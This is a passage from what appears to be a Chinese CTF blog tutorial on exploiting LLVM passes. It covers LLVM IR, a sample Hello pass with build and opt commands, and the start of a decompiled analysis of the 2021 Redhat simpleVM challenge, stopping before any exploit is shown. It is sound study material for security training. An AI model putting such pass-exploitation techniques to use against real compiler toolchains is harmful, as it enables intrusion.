    <content type="html"><![CDATA[<h1 id="llvm"><a href="#llvm" class="headerlink" title="llvm"></a>llvm</h1><p>要学习LLVM PASS类pwn，首先要知道什么是LLVM</p><p><code>LLVM</code>是<code>C++</code>编写的构架编译器的框架系统，可用于优化以任意程序语言编写的程序。</p><p><code>LLVM Pass</code>可用于对代码进行优化或者对代码插桩（插入新代码），<code>LLVM</code>的核心库中提供了一些<code>Pass</code>类可以继承，通过实现它的一些方法，可以对传入的<code>LLVM IR</code>进行遍历并操作。</p><p><code>LLVM IR</code>即代码的中间表示，有三种形式：</p><ol><li><code>.ll</code> 格式：人类可以阅读的文本,介于高级语言和汇编代码之间</li><li><code>.bc</code> 格式：bitcode适合机器存储的二进制文件</li><li>内存表示,只保存在内存中</li></ol><p>然后要知道LLVM PASS是什么：pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-12_124718.png" alt=""></p><p>首先我们的源代码会被clang编译器编译成一种中间代码——IR，这个叫IR的东西非常重要，它连接这编译器的前端和后端，IR的设计很大程度体现着LLVM插件化、模块化的设计哲学，LLVM的各种pass其实都是作用在LLVM IR上的。同时IR也是一个编译器组件接口。通常情况下，设计一门新的编程语言只需要完成能够生成LLVM IR的编译器前端即可，然后就可以轻松使用LLVM的各种编译优化、JIT支持、目标代码生成等功能。</p><p>大概就是说，LLVM提供了<strong>一种中间语言形式</strong>，以及编译链接这种语言的后端能力，那么<u>对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力</u>。</p><p>而LLVM PASS就是去处理IR文件，通过opt利用写好的so库优化已有的IR，形成新的IR。而LLVM PASS类的pwn就是利用这一过程中可能会出现的漏洞。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装<code>CTF</code>题目中常用的三个版本的<code>clang</code>及<code>LLVM</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo apt install llvm-12</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>一个测试用的c语言小程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please tell me your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, name, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, name, <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行编译然后执行如下命令，将c文件编译成ll后缀的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S test.c -o test.ll</span><br></pre></td></tr></table></figure><p>查看内容</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; ModuleID = &#x27;test.c&#x27;</span></span><br><span class="line">source_filename <span class="operator">=</span> <span class="string">&quot;test.c&quot;</span></span><br><span class="line"><span class="keyword">target</span> <span class="keyword">datalayout</span> <span class="operator">=</span> <span class="string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line"><span class="keyword">target</span> <span class="keyword">triple</span> <span class="operator">=</span> <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title">@.str</span> <span class="operator">=</span> <span class="keyword">private</span> <span class="keyword">unnamed_addr</span> <span class="keyword">constant</span> [<span class="number">26</span> <span class="keyword">x</span> <span class="type">i8</span>] <span class="keyword">c</span><span class="string">&quot;Please tell me your name:<span class="char escape_">\00</span>&quot;</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">1</span></span><br><span class="line"><span class="title">@.str.1</span> <span class="operator">=</span> <span class="keyword">private</span> <span class="keyword">unnamed_addr</span> <span class="keyword">constant</span> [<span class="number">8</span> <span class="keyword">x</span> <span class="type">i8</span>] <span class="keyword">c</span><span class="string">&quot;Hello: <span class="char escape_">\00</span>&quot;</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local <span class="type">i32</span> <span class="title">@main</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%1</span> <span class="operator">=</span> <span class="keyword">alloca</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">16</span></span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i32</span> <span class="title">@puts</span>(<span class="type">i8</span>* <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> ([<span class="number">26</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">26</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="title">@.str</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span>))</span><br><span class="line">  <span class="variable">%3</span> <span class="operator">=</span> <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="variable">%1</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span></span><br><span class="line">  <span class="variable">%4</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i64</span> <span class="title">@read</span>(<span class="type">i32</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i8</span>* <span class="variable">%3</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">16</span>)</span><br><span class="line">  <span class="variable">%5</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i32</span> (<span class="type">i8</span>*<span class="punctuation">,</span> ...) <span class="title">@printf</span>(<span class="type">i8</span>* <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> ([<span class="number">8</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">8</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="title">@.str.1</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span>))</span><br><span class="line">  <span class="variable">%6</span> <span class="operator">=</span> <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="variable">%1</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span></span><br><span class="line">  <span class="variable">%7</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i64</span> <span class="title">@write</span>(<span class="type">i32</span> <span class="number">1</span><span class="punctuation">,</span> <span class="type">i8</span>* <span class="variable">%6</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">16</span>)</span><br><span class="line">  <span class="keyword">ret</span> <span class="type">i32</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i32</span> <span class="title">@puts</span>(<span class="type">i8</span>*) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i64</span> <span class="title">@read</span>(<span class="type">i32</span><span class="punctuation">,</span> <span class="type">i8</span>*<span class="punctuation">,</span> <span class="type">i64</span>) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i32</span> <span class="title">@printf</span>(<span class="type">i8</span>*<span class="punctuation">,</span> ...) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i64</span> <span class="title">@write</span>(<span class="type">i32</span><span class="punctuation">,</span> <span class="type">i8</span>*<span class="punctuation">,</span> <span class="type">i64</span>) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">attributes</span> <span class="variable">#0</span> <span class="operator">=</span> &#123; <span class="keyword">noinline</span> <span class="keyword">nounwind</span> <span class="keyword">optnone</span> <span class="keyword">uwtable</span> <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span><span class="operator">=</span><span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span><span class="operator">=</span><span class="string">&quot;0&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span><span class="operator">=</span><span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span><span class="operator">=</span><span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span><span class="operator">=</span><span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"><span class="keyword">attributes</span> <span class="variable">#1</span> <span class="operator">=</span> &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span><span class="operator">=</span><span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span><span class="operator">=</span><span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span><span class="operator">=</span><span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span><span class="operator">=</span><span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="title">!llvm.module.flags</span> <span class="operator">=</span> !&#123;<span class="title">!0</span>&#125;</span><br><span class="line"><span class="title">!llvm.ident</span> <span class="operator">=</span> !&#123;<span class="title">!1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">!0</span> <span class="operator">=</span> !&#123;<span class="type">i32</span> <span class="number">1</span><span class="punctuation">,</span> !<span class="string">&quot;wchar_size&quot;</span><span class="punctuation">,</span> <span class="type">i32</span> <span class="number">4</span>&#125;</span><br><span class="line"><span class="title">!1</span> <span class="operator">=</span> !&#123;!<span class="string">&quot;clang version 10.0.0-4ubuntu1 &quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>接下来我们用官方给的小demo写一个LLVM PASS出来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Constants.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/BasicBlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.<span class="built_in">end</span>();</span><br><span class="line">      <span class="keyword">for</span>(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter = F.<span class="built_in">begin</span>(); bbIter != bbEnd; ++bbIter)&#123;</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;<span class="built_in">begin</span>();</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;<span class="built_in">end</span>();</span><br><span class="line">         <span class="keyword">for</span>(; instIter != instEnd; ++instIter)&#123;</span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;OpcodeName = &quot;</span> &lt;&lt; instIter-&gt;<span class="built_in">getOpcodeName</span>() &lt;&lt; <span class="string">&quot; NumOperands = &quot;</span> &lt;&lt; instIter-&gt;<span class="built_in">getNumOperands</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (instIter-&gt;<span class="built_in">getOpcode</span>() == <span class="number">56</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="type">const</span> CallInst* call_inst = <span class="built_in">dyn_cast</span>&lt;CallInst&gt;(instIter)) &#123;</span><br><span class="line">                    <span class="built_in">errs</span>() &lt;&lt; call_inst-&gt;<span class="built_in">getCalledFunction</span>()-&gt;<span class="built_in">getName</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; instIter-&gt;<span class="built_in">getNumOperands</span>()<span class="number">-1</span>; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">isa</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="built_in">getOperand</span>(i)))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Operand &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="built_in">getArgOperand</span>(i))-&gt;<span class="built_in">getZExtValue</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>上述代码中的<code>Hello</code>结构体继承了<code>LLVM</code>核心库中的<code>FunctionPass</code>类，并重写了其中的<code>runOnFunction</code>函数（一般的<code>CTF</code>题都是如此）。<strong><code>runOnFunction</code>函数在<code>LLVM</code>遍历到每一个传入的<code>LLVM IR</code>中的函数时都会被调用。</strong></p><ol><li><p><code>getName()</code>函数用于获取当前<code>runOnFunction</code>正处理的函数名</p></li><li><p>第一个<code>for</code>循环是对当前处理的函数中的基本块（比如一些条件分支语句就会产生多个基本块，在生成的<code>ll</code>文件中，不同基本块之间会有换行）遍历，第二个<code>for</code>循环是对每个基本块中的指令遍历</p></li><li><p><code>getOpcodeName()</code>函数用于获取指令的操作符的名称，<code>getNumOperands()</code>用于获取指令的操作数的个数，<code>getOpcode()</code>函数用于获取指令的操作符编号，在<code>/usr/include/llvm-xx/llvm/IR/Instruction.def</code>文件中有对应表，可以看到，<code>56</code>号对应着<code>Call</code>这个操作符：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="built_in">HANDLE_OTHER_INST</span>(``<span class="number">56</span>``, Call  , CallInst  ) <span class="comment">// Call a function</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>当在一个<code>A</code>函数中调用了<code>B</code>函数，在<code>LLVM IR</code>中，<code>A</code>会通过<code>Call</code>操作符调用<code>B</code>，<code>getCalledFunction()</code>函数就是用于获取此处<code>B</code>函数块的指针</p></li><li><code>getOperand(i)</code>是用于获取第<code>i</code>个操作数（在这里就是获取所调用函数的第<code>i</code>个参数），<code>getArgOperand()</code>函数与其用法类似，但只能获取参数，<code>getZExtValue()</code>即<code>get Zero Extended Value</code>，也就是将获取的操作数转为无符号扩展整数</li><li>再看到最内层<code>for</code>循环中的<code>instIter-&gt;getNumOperands()-1</code>，这里需要<code>-1</code>是因为对于<code>call</code>和<code>invoke</code>操作符，操作数的数量是实际参数的个数<code>+1</code>（因为将被调用者也当成了操作数）</li><li><code>if (isa&lt;ConstantInt&gt;(call_inst-&gt;getOperand(i)))</code>这行语句是通过<code>isa</code>判断当前获取到的操作数是不是立即数（<code>ConstantInt</code>）</li><li><code>static RegisterPass&lt;Hello&gt; X(&quot;Hello&quot;, &quot;Hello World Pass&quot;);</code>中的第一个参数就是注册的<code>PASS</code>名称</li></ol><p>使用以下命令将其编译为一个so模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure><p>接着，通过<code>opt -load ./LLVMHello.so -Hello test.ll</code>命令运行，得到如下结果：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> aichch  ~/Program/clang  opt -load ./LLVMHello.so -Hello test.ll</span><br><span class="line">WARNING: You<span class="string">&#x27;re attempting to print out a bitcode file.</span></span><br><span class="line"><span class="string">This is inadvisable as it may cause display problems. If</span></span><br><span class="line"><span class="string">you REALLY want to taste LLVM bitcode first-hand, you</span></span><br><span class="line"><span class="string">can force output with the `-f&#x27;</span> option.</span><br><span class="line"></span><br><span class="line">Hello: main</span><br><span class="line">OpcodeName = alloca NumOperands = 1</span><br><span class="line">OpcodeName = call NumOperands = 2</span><br><span class="line">puts</span><br><span class="line">OpcodeName = getelementptr NumOperands = 3</span><br><span class="line">OpcodeName = call NumOperands = 4</span><br><span class="line"><span class="built_in">read</span></span><br><span class="line">Operand 0 = 0</span><br><span class="line">Operand 2 = 16</span><br><span class="line">OpcodeName = call NumOperands = 2</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">OpcodeName = getelementptr NumOperands = 3</span><br><span class="line">OpcodeName = call NumOperands = 4</span><br><span class="line">write</span><br><span class="line">Operand 0 = 1</span><br><span class="line">Operand 2 = 16</span><br><span class="line">OpcodeName = ret NumOperands = 1</span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2021redhat-simpleVM"><a href="#2021redhat-simpleVM" class="headerlink" title="2021redhat-simpleVM"></a>2021redhat-simpleVM</h2><p>题目提供了三个文件</p><p><code>opt-8</code>,<code>VMPass.so</code>以及<code>libc-2.31.so</code></p><p>核心肯定在于<code>VMPass.so</code>,首先定位到RunOnFunction函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::getName(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    sub_6AC0(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果函数名是<code>o0o0o0o0</code>则会进入<code>sub_6AC0</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 